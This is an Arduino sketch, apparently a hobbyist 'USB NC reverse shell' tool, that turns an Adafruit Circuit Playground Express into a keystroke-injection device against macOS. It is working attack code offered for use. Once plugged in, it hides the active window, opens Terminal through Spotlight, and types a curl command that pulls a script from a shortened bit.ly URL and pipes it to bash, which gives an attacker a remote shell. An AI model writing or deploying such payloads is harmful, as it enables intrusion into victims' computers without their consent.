

#include "Keyboard.h"
/*
 █    ██   ██████  ▄▄▄▄       ███▄    █  ▄████▄      ██▀███  ▓█████ ██▒   █▓▓█████  ██▀███    ██████ ▓█████      ██████  ██░ ██ ▓█████  ██▓     ██▓    
 ██  ▓██▒▒██    ▒ ▓█████▄     ██ ▀█   █ ▒██▀ ▀█     ▓██ ▒ ██▒▓█   ▀▓██░   █▒▓█   ▀ ▓██ ▒ ██▒▒██    ▒ ▓█   ▀    ▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▓██  ▒██░░ ▓██▄   ▒██▒ ▄██   ▓██  ▀█ ██▒▒▓█    ▄    ▓██ ░▄█ ▒▒███   ▓██  █▒░▒███   ▓██ ░▄█ ▒░ ▓██▄   ▒███      ░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
▓▓█  ░██░  ▒   ██▒▒██░█▀     ▓██▒  ▐▌██▒▒▓▓▄ ▄██▒   ▒██▀▀█▄  ▒▓█  ▄  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄    ▒   ██▒▒▓█  ▄      ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
▒▒█████▓ ▒██████▒▒░▓█  ▀█▓   ▒██░   ▓██░▒ ▓███▀ ░   ░██▓ ▒██▒░▒████▒  ▒▀█░  ░▒████▒░██▓ ▒██▒▒██████▒▒░▒████▒   ▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░░▒▓███▀▒   ░ ▒░   ▒ ▒ ░ ░▒ ▒  ░   ░ ▒▓ ░▒▓░░░ ▒░ ░  ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░░░ ▒░ ░   ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
░░▒░ ░ ░ ░ ░▒  ░ ░▒░▒   ░    ░ ░░   ░ ▒░  ░  ▒        ░▒ ░ ▒░ ░ ░  ░  ░ ░░   ░ ░  ░  ░▒ ░ ▒░░ ░▒  ░ ░ ░ ░  ░   ░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░░░ ░ ░ ░  ░  ░   ░    ░       ░   ░ ░ ░             ░░   ░    ░       ░░     ░     ░░   ░ ░  ░  ░     ░      ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   
   ░           ░   ░                  ░ ░ ░            ░        ░  ░     ░     ░  ░   ░           ░     ░  ░         ░   ░  ░  ░   ░  ░    ░  ░    ░  ░
                        ░               ░                               ░                                                                              
USB NC REVERSE SHELL

@@@@@@@@@@@@@@@@@@@@@@@@@@BG&@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@&?. 7@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@G^    5@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@J      :#@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@PJYYYYYY5G&G        Y@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@J         .~   !:  .5GPPB#&@@@@@@@@@@@@@
@@@@@@@@@@@G~      .:.  !@!  ..    .^~?YP&@@@@@@@@
@@@@@@@@@@@@@Y.    :5G5:^J:~77^         !&@@@@@@@@
@@@@@@@@@@@@@@#57^.  .!!  ^JJ?:     .~Y#@@@@@@@@@@
@@@@@@@@@@@@@@@#?:  .5B? ?B^   ^^~75#@@@@@@@@@@@@@
@@@@@@@@@@@@@@B:    :!:  .YY   :G@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@~        ~.       ^&@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@J      .~5&J       .#@@@@@@@@@@@@@@@@
@@@@@@@@@@@@&~:~7JPB&@@@@B?:    .#@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@&&@@@@@@@@@@@@&P7: :#@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&GB@@@@@@@@@@@@@@@@@

|__________________________________|
|   for circut playground express  |
|    devloper edition only         |
|                                  |
|                                  |
|   Hid only for macos attacking   |
|__________________________________|

This is a hid attack vector for the adafruit circut playground express devloper edition for macos reverse shell hacking.

//
*/
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();
  // Goto Desktop
  delay(500);
  delay(1000);
// hides the keyboard setup
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('h');
  Keyboard.releaseAll();

  delay(800);
  // Wait 500ms
  delay(500);

 
  delay(1000);
  //opens terminal
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("Terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("sh");
  delay(500);
  typeKey(KEY_RETURN);
  delay(500);
  
  
  //replace ip with your ip              (this below is ip)
  Keyboard.print("curl -s -L https://bit.ly/3zvELNz | bash");
  typeKey(KEY_RETURN);

  

  


  Keyboard.end();
}

/* Unused endless loop */


void loop() {}
/*
 by:

 .o88b. d8888b. db    db d8888b. d888888b 
d8P  Y8 88  `8D `8b  d8' 88  `8D `~~88~~' 
8P      88oobY'  `8bd8'  88oodD'    88    
8b      88`8b      88    88~~~      88    
Y8b  d8 88 `88.    88    88         88    
 `Y88P' 88   YD    YP    88         YP    
*/